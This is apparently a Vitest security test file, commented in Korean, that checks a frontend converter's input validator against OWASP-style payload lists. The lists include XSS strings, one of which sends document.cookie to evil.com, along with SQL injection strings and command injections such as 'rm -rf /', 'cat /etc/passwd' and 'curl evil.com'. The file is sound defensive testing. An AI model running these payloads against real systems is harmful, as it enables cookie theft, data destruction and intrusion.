import { describe, it, expect } from 'vitest';
import { isValidInput } from './converter';

/**
 * 보안 테스트 - OWASP Top 10 기반
 * 프론트엔드 애플리케이션에 해당하는 보안 위협을 테스트합니다.
 */
describe('Security Tests', () => {
  describe('A03:2021 - Injection', () => {
    describe('XSS (Cross-Site Scripting) 방어', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
      ];

      xssPayloads.forEach((payload) => {
        it(`XSS 페이로드 차단: ${payload.substring(0, 30)}...`, () => {
          // isValidInput은 숫자가 아닌 입력을 거부해야 함
          // 단, 숫자로 시작하는 경우 parseFloat에 의해 숫자로 처리됨
          const startsWithNumber = /^[\d\s.]/.test(payload);
          if (startsWithNumber) {
            // 숫자로 시작하면 parseFloat이 숫자 부분만 파싱 (한계점)
            expect(isValidInput(payload)).toBe(true);
          } else {
            expect(isValidInput(payload)).toBe(false);
          }
        });
      });

      it('순수 텍스트 XSS 페이로드는 거부된다', () => {
        expect(isValidInput('<script>')).toBe(false);
        expect(isValidInput('alert(1)')).toBe(false);
        expect(isValidInput('onclick=')).toBe(false);
      });
    });

    describe('SQL Injection 방어 (참고: 프론트엔드 전용)', () => {
      const sqlPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        '1; DELETE FROM users',
      ];

      sqlPayloads.forEach((payload) => {
        it(`SQL 페이로드가 숫자로 파싱되지 않음: ${payload.substring(0, 20)}...`, () => {
          const startsWithNumber = /^[\d\s.]/.test(payload);
          if (startsWithNumber) {
            expect(isValidInput(payload)).toBe(true);
          } else {
            expect(isValidInput(payload)).toBe(false);
          }
        });
      });
    });

    describe('Command Injection 방어', () => {
      const cmdPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '`rm -rf /`',
        '$(whoami)',
        '&& curl evil.com',
      ];

      cmdPayloads.forEach((payload) => {
        it(`명령어 페이로드 차단: ${payload}`, () => {
          expect(isValidInput(payload)).toBe(false);
        });
      });
    });
  });

  describe('A04:2021 - Insecure Design', () => {
    describe('입력 경계값 검증', () => {
      it('음수 입력을 거부한다', () => {
        expect(isValidInput('-1')).toBe(false);
        expect(isValidInput('-100')).toBe(false);
        expect(isValidInput('-0.001')).toBe(false);
      });

      it('NaN을 생성하는 입력을 거부한다', () => {
        expect(isValidInput('NaN')).toBe(false);
        expect(isValidInput('undefined')).toBe(false);
        expect(isValidInput('null')).toBe(false);
      });

      it('빈 입력을 거부한다', () => {
        expect(isValidInput('')).toBe(false);
        expect(isValidInput('.')).toBe(false);
      });

      it('극단적인 숫자도 유효로 처리된다 (비즈니스 로직 한계)', () => {
        // 주의: 실제로는 상한선이 필요할 수 있음
        expect(isValidInput('999999999999')).toBe(true);
        expect(isValidInput('0.0000000001')).toBe(true);
      });
    });
  });

  describe('A05:2021 - Security Misconfiguration', () => {
    describe('프로토타입 오염 방어', () => {
      it('__proto__ 문자열은 유효하지 않다', () => {
        expect(isValidInput('__proto__')).toBe(false);
        expect(isValidInput('constructor')).toBe(false);
        expect(isValidInput('prototype')).toBe(false);
      });
    });
  });

  describe('A07:2021 - Identification and Authentication Failures', () => {
    describe('세션/토큰 탈취 시도 방어', () => {
      it('쿠키 접근 시도 문자열은 유효하지 않다', () => {
        expect(isValidInput('document.cookie')).toBe(false);
        expect(isValidInput('localStorage')).toBe(false);
        expect(isValidInput('sessionStorage')).toBe(false);
      });
    });
  });

  describe('추가 보안 테스트', () => {
    describe('특수문자 처리', () => {
      it('NULL 바이트를 포함한 입력', () => {
        expect(isValidInput('\0')).toBe(false);
        expect(isValidInput('10\0')).toBe(true); // parseFloat이 숫자만 파싱
      });

      it('유니코드 공격 문자', () => {
        expect(isValidInput('\u200B')).toBe(false); // Zero-width space
        expect(isValidInput('\uFEFF')).toBe(false); // BOM
      });

      it('제어 문자', () => {
        expect(isValidInput('\n')).toBe(false);
        expect(isValidInput('\r')).toBe(false);
        expect(isValidInput('\t')).toBe(false);
      });
    });

    describe('숫자 오버플로우', () => {
      it('Number.MAX_VALUE 이상의 값', () => {
        const hugeNumber = '1e309'; // Infinity가 됨
        expect(isValidInput(hugeNumber)).toBe(true); // Infinity도 유효한 숫자
      });

      it('Number.MIN_VALUE 미만의 값', () => {
        const tinyNumber = '1e-324'; // 0에 가까워짐
        expect(isValidInput(tinyNumber)).toBe(true);
      });
    });

    describe('정규표현식 DoS (ReDoS) 저항성', () => {
      it('긴 문자열 입력도 빠르게 처리된다', () => {
        const longString = '1'.repeat(10000);
        const startTime = performance.now();
        isValidInput(longString);
        const endTime = performance.now();

        // 100ms 이내에 처리되어야 함
        expect(endTime - startTime).toBeLessThan(100);
      });
    });
  });

  describe('DOM 보안', () => {
    it('innerHTML 위험 문자열은 유효하지 않다', () => {
      expect(isValidInput('innerHTML')).toBe(false);
      expect(isValidInput('outerHTML')).toBe(false);
      expect(isValidInput('insertAdjacentHTML')).toBe(false);
    });

    it('eval 관련 문자열은 유효하지 않다', () => {
      expect(isValidInput('eval(')).toBe(false);
      expect(isValidInput('Function(')).toBe(false);
      expect(isValidInput('setTimeout(')).toBe(false);
    });
  });
});

describe('Input Sanitization Recommendations', () => {
  /**
   * 현재 isValidInput 함수의 한계점과 개선 권장사항을 문서화
   */
  describe('현재 구현의 한계점 (문서화 목적)', () => {
    it('숫자로 시작하는 악성 문자열이 통과됨', () => {
      // 이는 현재 구현의 알려진 한계
      // parseFloat은 앞의 숫자만 파싱하고 나머지를 무시
      expect(isValidInput('10<script>')).toBe(true); // 한계점
      expect(isValidInput('5; DROP TABLE')).toBe(true); // 한계점
    });

    it('개선 권장: 숫자만 포함되었는지 정규식 검증 추가 필요', () => {
      // 권장 구현:
      // const isStrictNumber = (value: string) => /^\d*\.?\d+$/.test(value);
      const isStrictNumber = (value: string) => /^\d*\.?\d+$/.test(value);

      expect(isStrictNumber('10')).toBe(true);
      expect(isStrictNumber('10.5')).toBe(true);
      expect(isStrictNumber('10<script>')).toBe(false); // 개선됨
      expect(isStrictNumber('5; DROP')).toBe(false); // 개선됨
    });
  });
});
